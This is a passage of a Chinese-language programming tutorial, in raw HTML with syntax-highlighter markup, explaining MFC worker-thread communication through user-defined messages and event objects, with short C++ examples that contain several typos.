crayon-striped-line\" id=\"crayon-5a6f3a4d88b37314983659-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b37314983659-3\">　<span class=\"crayon-v\">bend</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">TRUE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//改变变量，线程结束</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b37314983659-4\">　<span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">m_hThread</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">INFINITE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//等待线程结束</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b37314983659-5\">　<span class=\"crayon-e\">delete </span><span class=\"crayon-v\">pThread</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//删除线程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b37314983659-6\">　<span class=\"crayon-v\">Cview</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnDestroy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b37314983659-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h2>3、线程之间的通信</h2>\n<p>通常情况下，一个次级线程要为主线程完成某种特定类型的任务，这就隐含着表示在主线程和次级线程之间需要建立一个通信的通道。一般情况下，有下面的几种方法实现这种通信任务：使用全局变量（上一节的例子其实使用的就是这种方法）、使用事件对象、使用消息。这里我们主要介绍后两种方法。</p>\n<h3>（一） 利用用户定义的消息通信</h3>\n<p>在Windows程序设计中，应用程序的每一个线程都拥有自己的消息队列，甚至工作线程也不例外，这样一来，就使得线程之间利用消息来传递信息就变的非常简单。首先用户要定义一个用户消息，如下所示：#define WM_USERMSG WMUSER+100；在需要的时候，在一个线程中调用：：PostMessage((HWND)param,WM_USERMSG,0,0)或CwinThread::PostThradMessage（）来向另外一个线程发送这个消息，上述函数的四个参数分别是消息将要发送到的目的窗口的句柄、要发送的消息标志符、消息的参数WPARAM和LPARAM。下面的代码是对上节代码的修改，修改后的结果是在线程结束时显示一个对话框，提示线程结束：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b3b798272405\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nUINT ThreadFunction(LPVOID pParam)\r\n{\r\n　while(!bend)\r\n　{\r\n　　Beep(100,100);\r\n　　Sleep(1000);\r\n　}\r\n　：：PostMessage(hWnd,WM_USERMSG,0,0)；\r\n　return 0;\r\n}\r\n////////WM_USERMSG消息的响应函数为OnThreadended(WPARAM wParam,\r\nLPARAM lParam)\r\nLONG CTestView::OnThreadended(WPARAM wParam,LPARAM lParam)\r\n{\r\n　AfxMessageBox(\"Thread ended.\");\r\n　Retrun 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3b798272405-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-1\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadFunction</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">pParam</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-3\">　<span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bend</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-4\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-5\">　　<span class=\"crayon-e\">Beep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-6\">　　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-7\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-8\">　：：<span class=\"crayon-e\">PostMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">WM_USERMSG</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span>；</div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-9\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-10\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-11\"><span class=\"crayon-c\">////////WM_USERMSG消息的响应函数为OnThreadended(WPARAM wParam,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-12\"><span class=\"crayon-e\">LPARAM </span><span class=\"crayon-v\">lParam</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-13\"><span class=\"crayon-t\">LONG</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CTestView</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnThreadended</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">WPARAM </span><span class=\"crayon-v\">wParam</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">LPARAM </span><span class=\"crayon-v\">lParam</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-14\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-15\">　<span class=\"crayon-e\">AfxMessageBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Thread ended.\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3b798272405-16\">　<span class=\"crayon-i\">Retrun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3b798272405-17\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>上面的例子是工作者线程向用户界面线程发送消息，对于工作者线程，如果它的设计模式也是消息驱动的，那么调用者可以向它发送初始化、退出、执行某种特定的处理等消息，让它在后台完成。在控制函数中可以直接使用：：GetMessage()这个SDK函数进行消息分检和处理，自己实现一个消息循环。GetMessage()函数在判断该线程的消息队列为空时，线程将系统分配给它的时间片让给其它线程，不无效的占用CPU的时间，如果消息队列不为空，就获取这个消息，判断这个消息的内容并进行相应的处理。</p>\n<h3>（二）用事件对象实现通信</h3>\n<p>在线程之间传递信号进行通信比较复杂的方法是使用事件对象，用MFC的Cevent类的对象来表示。事件对象处于两种状态之一：有信号和无信号，线程可以监视处于有信号状态的事件，以便在适当的时候执行对事件的操作。上述例子代码修改如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b3f589134401\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCevent threadStart ,threadEnd;\r\nUINT ThreadFunction(LPVOID pParam)\r\n{\r\n　：：WaitForSingleObject(threadStart.m_hObject,INFINITE);\r\n　AfxMessageBox(\"Thread start.\");\r\n　while(!bend)\r\n　{\r\n　　Beep(100,100);\r\n　　Sleep(1000);\r\n　　Int result=::WaitforSingleObject(threadEnd.m_hObject,0);\r\n　　//等待threadEnd事件有信号，无信号时线程在这里悬停\r\n　　If(result==Wait_OBJECT_0)\r\n　　　Bend=TRUE;\r\n　}\r\n　：：PostMessage(hWnd,WM_USERMSG,0,0)；\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b3f589134401-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-1\"><span class=\"crayon-e\">Cevent </span><span class=\"crayon-i\">threadStart</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">threadEnd</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-2\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadFunction</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">pParam</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-3\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-4\">　：：<span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadStart</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">m_hObject</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">INFINITE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-5\">　<span class=\"crayon-e\">AfxMessageBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Thread start.\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-6\">　<span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bend</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-7\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-8\">　　<span class=\"crayon-e\">Beep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-9\">　　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-10\">　　<span class=\"crayon-t\">Int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">WaitforSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadEnd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">m_hObject</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-11\">　　<span class=\"crayon-c\">//等待threadEnd事件有信号，无信号时线程在这里悬停</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-12\">　　<span class=\"crayon-st\">If</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">result</span><span class=\"crayon-o\">==</span><span class=\"crayon-v\">Wait_OBJECT_0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-13\">　　　<span class=\"crayon-v\">Bend</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">TRUE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-14\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-15\">　：：<span class=\"crayon-e\">PostMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">WM_USERMSG</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span>；</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b3f589134401-16\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b3f589134401-17\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b42249255571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nVoid CtestView::OninitialUpdate()\r\n{ \r\n　hWnd=GetSafeHwnd();\r\n　threadStart.SetEvent();//threadStart事件有信号\r\n　pThread=AfxBeginThread(ThreadFunction,hWnd);//启动线程\r\n　pThread-&gt;m_bAutoDelete=FALSE;\r\n　Cview::OnInitialUpdate();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b42249255571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b42249255571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b42249255571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b42249255571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b42249255571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b42249255571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b42249255571-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b42249255571-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b42249255571-1\"><span class=\"crayon-t\">Void</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CtestView</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OninitialUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b42249255571-2\"><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b42249255571-3\">　<span class=\"crayon-v\">hWnd</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">GetSafeHwnd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b42249255571-4\">　<span class=\"crayon-v\">threadStart</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//threadStart事件有信号</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b42249255571-5\">　<span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">AfxBeginThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThreadFunction</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//启动线程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b42249255571-6\">　<span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">m_bAutoDelete</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b42249255571-7\">　<span class=\"crayon-v\">Cview</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnInitialUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b42249255571-8\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b4b473049698\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nVoid CtestView::OnDestroy()\r\n{\r\n　threadEnd.SetEvent();\r\n　WaitForSingleObject(pThread-&gt;m_hThread,INFINITE);\r\n　delete pThread;\r\n　Cview::OnDestroy();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px 